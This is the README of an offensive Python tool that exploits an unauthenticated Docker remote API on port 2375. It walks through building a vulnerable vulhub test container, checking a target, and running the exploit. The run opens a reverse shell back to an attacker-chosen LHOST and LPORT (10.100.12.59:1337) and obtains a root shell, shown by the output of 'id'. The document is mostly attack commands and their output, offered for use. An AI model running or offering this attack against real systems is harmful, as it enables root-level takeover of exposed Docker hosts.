# docker_api_rce.py

## Summary

If can abuse docker remotely if you have permission to connect to it without andy credentials.
This will pop shell.

## Usage

Start docker container with if you want to test this locally

```sh
⬢  docker_api_rce  master ⦿ docker-compose build
Building docker_api
Step 1/3 : FROM vulhub/docker:18.03.0
 ---> a98b9e39cc6d
Step 2/3 : ADD docker-entrypoint.sh /
 ---> Using cache
 ---> 121fbcbf91a6
Step 3/3 : ENTRYPOINT [ "/docker-entrypoint.sh" ]
 ---> Using cache
 ---> 1081259976ee
Successfully built 1081259976ee
Successfully tagged dockerapirce_docker_api:latest

⬢  docker_api_rce  master ⦿ docker-compose up -d
Recreating dockerapirce_docker_api_1 ... done
```

Verify that container is running.

```sh
⬢  docker_api_rce  master ⦿ docker ps
CONTAINER ID        IMAGE                     COMMAND                  CREATED             STATUS              PORTS                    NAMES
7ed587ab2261        dockerapirce_docker_api   "/docker-entrypoint.…"   16 seconds ago      Up 15 seconds       0.0.0.0:2375->2375/tcp   dockerapirce_docker_api_1
```

Run 

```sh
⬢  docker_api_rce  master ⦿ ./docker_api_rce.py

·▄▄▄▄         ▄▄· ▄ •▄ ▄▄▄ .▄▄▄   ▄▄▄·  ▄▄▄·▪  ▄▄▄   ▄▄· ▄▄▄ .
██▪ ██ ▪     ▐█ ▌▪█▌▄▌▪▀▄.▀·▀▄ █·▐█ ▀█ ▐█ ▄███ ▀▄ █·▐█ ▌▪▀▄.▀·
▐█· ▐█▌ ▄█▀▄ ██ ▄▄▐▀▀▄·▐▀▀▪▄▐▀▀▄ ▄█▀▀█  ██▀·▐█·▐▀▀▄ ██ ▄▄▐▀▀▪▄
██. ██ ▐█▌.▐▌▐███▌▐█.█▌▐█▄▄▌▐█•█▌▐█ ▪▐▌▐█▪·•▐█▌▐█•█▌▐███▌▐█▄▄▌
▀▀▀▀▀•  ▀█▄▀▪·▀▀▀ ·▀  ▀ ▀▀▀ .▀  ▀ ▀  ▀ .▀   ▀▀▀.▀  ▀·▀▀▀  ▀▀▀
[nighter@nighter.se]

Usage: ./docker_api_rce.py <URL> <LHOST> <LPORT>

EXAMPLE: ./docker_api_rce.py 'http://0.0.0.0:2375/' check
EXAMPLE: ./docker_api_rce.py 'http://0.0.0.0:2375/' 10.10.14.24 1337
```        

Verify that host is vulnerable

```sh
⬢  docker_api_rce  master ⦿ ./docker_api_rce.py 'http://0.0.0.0:2375/' check
[+] http://0.0.0.0:2375/ Vulnerable
```

Run the exploit.

```sh
⬢  docker_api_rce  master ⦿ ./docker_api_rce.py 'http://0.0.0.0:2375/' 10.100.12.59 1337
[+] LHOST = 10.100.12.59
[+] LPORT = 1337
[+] Shell listen
[+] http://0.0.0.0:2375/ Vulnerable
[+] Exploit
Connection from 172.28.0.2:41433
/ # id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```